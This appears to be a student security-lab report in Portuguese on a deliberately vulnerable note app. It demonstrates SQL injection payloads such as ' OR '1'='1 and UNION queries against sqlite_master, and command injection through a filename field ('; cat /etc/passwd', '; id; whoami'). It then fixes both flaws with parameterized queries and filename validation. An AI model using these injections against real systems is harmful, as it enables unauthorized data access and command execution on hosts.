## 1)

**Search query: ' OR '1'='1**
```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' OR '1'='1
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' OR '1'='1%'
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.

```

```sql
SELECT ... WHERE title LIKE '%' OR '1'='1%'
```
A condição `'1'='1'` é sempre verdadeira. A cláusula `WHERE` torna-se sempre verdadeira => Todas as linhas da tabela são devolvidas.


**Search query: ' UNION SELECT 1, sql, '' FROM sqlite_master --**
```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' UNION SELECT 1, sql, '' FROM sqlite_master --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' UNION SELECT 1, sql, '' FROM sqlite_master --%'
  [1] CREATE TABLE notes (id INTEGER PRIMARY KEY, title TEXT, body TEXT): 
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

Usa `UNION` para combinar resultados com outra query e consulta a tabela interna `sqlite_master` que contém estrutura da base de dados (tabelas, queries de criação, etc.).

**Search query: ' UNION SELECT 1, title, body FROM notes --**
```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 1
  Search query: ' UNION SELECT 1, title, body FROM notes --
[DEBUG] Executing SQL: SELECT id, title, body FROM notes WHERE title LIKE '%' UNION SELECT 1, title, body FROM notes --%'
  [1] Reminder: Submit the SSI lab report on time.
  [1] Secret: The admin password is hunter2.
  [1] Welcome: This is your first note.
  [2] Reminder: Submit the SSI lab report on time.
  [3] Secret: The admin password is hunter2.
```

Injeta uma nova query que lê diretamente a tabela `notes`. Funciona pois permite acesso direto aos dados sem restrições e ignora completamente a lógica da aplicação.

## 2)

```
=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: note.txt
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt
  Note exported to note.txt

=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: note.txt; cat /etc/passwd
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt; cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
syslog:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
sshd:x:103:65534::/run/sshd:/usr/sbin/nologin
goncalo:x:1001:1001:,,,:/home/goncalo:/bin/bash
anibal:x:1004:1004:,,,:/home/anibal:/bin/bash
antonio:x:1005:1005:,,,:/home/antonio:/bin/bash
amilcar:x:1006:1006:,,,:/home/amilcar:/bin/bash
userssi:x:1007:1007::/home/userssi:/bin/sh
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
  Note exported to note.txt; cat /etc/passwd

=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: note.txt; id; whoami
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > note.txt; id; whoami
uid=1001(goncalo) gid=1001(goncalo) groups=1001(goncalo),27(sudo),100(users),104(docker)
goncalo
  Note exported to note.txt; id; whoami

=== Note App ===
1. Search notes
2. Export note
3. Quit
Choice: 2
  Note ID: 1
  Enter filename to export to: `ls -la`
[DEBUG] Executing command: echo 'Title: Welcome
Body: This is your first note.' > `ls -la`
sh: 1: cannot create total 28
drwxrwxr-x  2 goncalo goncalo 4096 May  4 17:59 .
drwxr-x--- 11 goncalo goncalo 4096 May  4 17:42 ..
-rw-rw-r--  1 goncalo goncalo   46 May  4 18:00 note.txt
-rw-r--r--  1 goncalo goncalo 2606 Apr 19 17:26 noteapp.py
-rw-r--r--  1 goncalo goncalo 8192 May  4 17:44 notes.db
-rw-rw-r--  1 goncalo goncalo 1239 May  4 17:40 week12-files.zip: File name too long
  Note exported to `ls -la`

=== Note App ===
1. Search notes
2. Export note
3. Quit
```

Um possível atacante tem com esta opção, oportunidade de executar comandos na máquina host, fora do âmbito do programa `noteapp.py`.

## 3)

```python
def search_notes(query):
    conn = sqlite3.connect(DB_FILE)

    # Query parametrizada com wildcard
    sql = "SELECT id, title, body FROM notes WHERE title LIKE ?"
    param = f"%{query}%"

    print(f"[DEBUG] Executing SQL: {sql} with param={param}")

    try:
        cursor = conn.execute(sql, (param,))
        results = cursor.fetchall()
        if results:
            for row in results:
                print(f"  [{row[0]}] {row[1]}: {row[2]}")
        else:
            print("  No notes found.")
    except sqlite3.Error as e:
        print(f"  SQL error: {e}")

    conn.close()
```

- Uso de `?` evita concatenação de strings
- O input é tratado como **dados**, não como código SQL
- Wildcards (`%`) são preservados na variável `param`

![[Pasted image 20260504194252.png]]


## 4)

```python
import re

def export_note(note_id):
    """Export a note to a file: VULNERABLE to command injection."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.execute(
        "SELECT title, body FROM notes WHERE id = ?", (note_id,)
    )
    row = cursor.fetchone()
    conn.close()

    if row is None:
        print("  Note not found.")
        return
        
    filename = input(" Enter filename to export to: ")

    # Sanitização do nome do ficheiro (apenas letras, números, _, .)
    if not re.match(r'^[\w\-.]+$', filename):
        print("  Invalid filename.")
        return

    # Escrita direta (sem shell)
    try:
        with open(filename, "w") as f:
            f.write(f"Title: {row[0]}\nBody: {row[1]}\n")
        print(f"  Note exported to {filename}")
    except Exception as e:
        print(f"  Error writing file: {e}")
```

- Removido `os.system()` → elimina execução de comandos
- Escrita direta em ficheiro → sem shell
- Validação do filename → impede caracteres perigosos (`;`, `|`, etc.)

![[Pasted image 20260504194927.png]]

## 5)

A causa comum partilhada por buffer overflows, vulnerabilidades de string de formato, SQL injection e command injection é a **confusão entre dados e código**. Em todos os casos, o input do utilizador é tratado como parte da lógica do programa, permitindo que um atacante influencie o comportamento interno — seja sobrescrevendo memória, lendo dados sensíveis ou executando comandos arbitrários.

A validação de entradas, por si só, é insuficiente porque é difícil prever todas as formas maliciosas de input. Mesmo com filtros, um atacante pode contorná-los com variações inesperadas. Além disso, erros na implementação da validação podem introduzir novas falhas. Por isso, a validação deve ser complementada com mecanismos mais robustos.

Os princípios de **parametrização** e **privilégio mínimo** são fundamentais. A parametrização (ex: queries SQL com `?`) garante que o input é tratado apenas como dados, eliminando a possibilidade de injeção. O privilégio mínimo limita o impacto de um ataque, garantindo que mesmo que uma vulnerabilidade exista, o atacante não tem acesso total ao sistema ou à base de dados.

Embora buffer overflows e vulnerabilidades de string de formato exponham memória da stack, diferem no modo de exploração. No buffer overflow, o atacante **escreve além dos limites**, podendo alterar o fluxo de execução (ex: return address). Já nas format strings, o atacante **lê (e por vezes escreve) memória** usando especificadores como `%p` ou `%n`, explorando o comportamento de funções como `printf`.